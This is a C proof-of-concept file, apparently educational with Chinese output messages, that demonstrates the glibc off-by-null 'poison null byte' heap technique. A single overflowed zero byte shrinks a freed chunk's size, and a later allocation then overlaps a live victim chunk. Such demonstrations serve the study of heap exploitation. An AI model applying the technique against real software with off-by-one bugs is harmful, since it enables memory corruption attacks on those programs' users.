#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main()
{

    fprintf(stderr, "当存在 off by null 的时候可以使用该技术\n");

    uint8_t* a;
    uint8_t* b;
    uint8_t* c;
    uint8_t* b1;
    uint8_t* b2;
    uint8_t* d;
    void *barrier;

    fprintf(stderr, "申请 0x100 的 chunk a\n");
    a = (uint8_t*) malloc(0x100);
    fprintf(stderr, "a 在: %p\n", a);
    int real_a_size = malloc_usable_size(a);
    fprintf(stderr, "因为我们想要溢出 chunk a，所以需要知道他的实际大小: %#x\n", real_a_size);

    b = (uint8_t*) malloc(0x200);

    fprintf(stderr, "b: %p\n", b);

    c = (uint8_t*) malloc(0x100);
    fprintf(stderr, "c: %p\n", c);

    barrier =  malloc(0x100);
    fprintf(stderr, "另外再申请了一个 chunk c：%p，防止 free 的时候与 top chunk 发生合并的情况\n", barrier);

    uint64_t* b_size_ptr = (uint64_t*)(b - 8);
    fprintf(stderr, "会检查 chunk size 与 next chunk 的 prev_size 是否相等，所以要在后面一个 0x200 来绕过检查\n");
    *(size_t*)(b+0x1f0) = 0x200;

    free(b);
    
    fprintf(stderr, "b 的 size: %#lx\n", *b_size_ptr);
    fprintf(stderr, "假设我们写 chunk a 的时候多写了一个 0x00 在 b 的 size 的 p 位上\n");
    a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
    fprintf(stderr, "b 现在的 size: %#lx\n", *b_size_ptr);

    uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
    fprintf(stderr, "c 的 prev_size 是 %#lx\n",*c_prev_size_ptr);

    fprintf(stderr, "但他根据 chunk b 的 size 找的时候会找到 b+0x1f0 那里，我们将会成功绕过 chunk 的检测 chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",
        *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
    b1 = malloc(0x100);

    fprintf(stderr, "申请一个 0x100 大小的 b1: %p\n",b1);
    fprintf(stderr, "现在我们 malloc 了 b1 他将会放在 b 的位置，这时候 c 的 prev_size 依然是: %#lx\n",*c_prev_size_ptr);
    fprintf(stderr, "但是我们之前写 0x200 那个地方已经改成了: %lx\n",*(((uint64_t*)c)-4));
    fprintf(stderr, "接下来 malloc 'b2', 作为 'victim' chunk.\n");

    b2 = malloc(0x80);
    fprintf(stderr, "b2 申请在: %p\n",b2);

    memset(b2,'B',0x80);
    fprintf(stderr, "现在 b2 填充的内容是:\n%s\n",b2);

    fprintf(stderr, "现在对 b1 和 c 进行 free 因为 c 的 prev_size 是 0x210，所以会把他俩给合并，但是这时候里面还包含 b2 呐.\n");

    free(b1);
    free(c);
    
    fprintf(stderr, "这时候我们申请一个 0x300 大小的 chunk 就可以覆盖着 b2 了\n");
    d = malloc(0x300);
    fprintf(stderr, "d 申请到了: %p，我们填充一下 d 为 \"D\"\n",d);
    memset(d,'D',0x300);

    fprintf(stderr, "现在 b2 的内容就是:\n%s\n",b2);

}
